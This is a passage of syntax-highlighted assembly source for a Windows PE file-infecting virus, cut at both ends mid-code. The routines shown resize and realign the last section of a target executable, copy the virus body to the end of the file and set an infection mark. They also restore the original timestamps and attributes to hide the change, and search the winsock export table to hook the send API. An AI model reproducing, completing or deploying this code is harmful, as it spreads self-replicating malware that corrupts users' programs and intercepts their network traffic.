    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save it</span><span class="sc0">

    </span><span class="sc5">VirtualSizeCheck</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; get old </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">; virtualsize</span><span class="sc0">
    </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">NewVirtualSize</span><span class="sc0">

    </span><span class="sc5">VirtualSizeIsVirtual</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Leap</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">             
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; and align it to</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; the sectionalign</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc5">NewVirtualSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; save new value</span><span class="sc0">

    </span><span class="sc5">NewAlignedImageSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get virtual offset    </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; + new virtual size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; = new imagesize</span><span class="sc0">

    </span><span class="sc5">NewAlignedFileSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get new phys size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; add offset of phys</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; and align it to</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; the filealign</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; size = filesize</span><span class="sc0">

    </span><span class="sc5">CalculateNewWsockApiAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; + virtual offset</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InterceptWsockApiCall</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">      </span><span class="sc1">; + ip</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wnewapiaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; new api address</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">HookDaApi</span><span class="sc0">

    </span><span class="sc5">HookDaApi</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">HOOK_API</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">CopyVirusToEndOfFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; mapaddress</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; add raw data offset</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; copy virus</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Leap</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">

    </span><span class="sc5">UpdatePEHeaderWithChanges</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ll'</span><span class="sc0">          </span><span class="sc1">; set infectionmark</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">   
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">imagesize</span><span class="sc4">]</span><span class="sc0">      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; set new imagesize</span><span class="sc0">
        
</span><span class="sc1">;--------------------------------[ unmap file ]------------------------------;</span><span class="sc0">

    </span><span class="sc5">UnmapView</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AUnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc5">CloseMap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">maphandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFilePointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetEndOfFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

</span><span class="sc1">;--------------------------------[ close file ]------------------------------;</span><span class="sc0">

    </span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_ftLastWriteTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_ftLastAccessTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_ftCreationTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFileTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACloseHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc5">InfectionError</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">myfinddata.fd_cFileName</span><span class="sc4">]</span><span class="sc0">    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASetFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">INFECT_FILE</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;===========================[ ic-hook_api.inc ]=============================;</span><span class="sc0">

</span><span class="sc5">HOOK_API</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">LoadWSockExportTableData</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; rva export table</span><span class="sc0">
      
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">; get RVA</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA_TO_RAW</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">          
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">numberofnames</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save number of names</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with </span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA_TO_RAW</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; pointers to funtion</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressoffunctions</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; addresses</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA_TO_RAW</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; pointers to names</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addressofnames</span><span class="sc4">],</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; of functions</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; get ra of table with</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA_TO_RAW</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; pointers to ordinals</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">addressofordinals</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; of functions</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">BeginSendAddressSearch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">addressofnames</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; search for </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AONindex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">           </span><span class="sc1">; API in names</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; table</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA_TO_RAW</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    

    </span><span class="sc5">HookSendApi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ASend</span><span class="sc4">]</span><span class="sc0">      

    </span><span class="sc5">OkTryAgain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                    

    </span><span class="sc5">MatchByteNow</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmpsb</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextOneNow</span><span class="sc0">                  
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; did the entire string</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">YesGotIt</span><span class="sc0">                 </span><span class="sc1">; match ?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">MatchByteNow</span><span class="sc0">

    </span><span class="sc5">NextOneNow</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      
